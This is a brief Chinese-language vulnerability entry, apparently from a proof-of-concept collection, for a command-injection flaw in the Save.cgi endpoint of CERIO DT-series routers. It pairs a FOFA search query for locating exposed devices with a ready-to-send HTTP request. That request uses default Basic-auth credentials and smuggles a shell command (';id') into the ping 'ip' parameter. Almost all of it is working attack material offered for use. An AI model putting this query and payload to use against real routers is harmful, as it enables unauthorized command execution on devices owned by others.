## CERIO-DT系列路由器Save.cgi接口存在命令执行漏洞

CERIO DT系列路由器是中国台湾智鼎资讯（CERIO）公司的一款无线路由器。CERIO DT系列路由器在特定版本中存在操作命令注入漏洞。攻击者可利用该漏洞执行命令。

## fofa
```
title="DT-100G-N" || title="DT-300N" || title="DT-100G" || title="AMR-3204G" || title="WMR-200N"
```

## poc
```
POST /cgi-bin/Save.cgi?cgi=PING HTTP/1.1
Host: 
Authorization: Basic b3BlcmF0b3I6MTIzNA==
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 33

pid=2061&ip=127.0.0.1;id&times=1
```

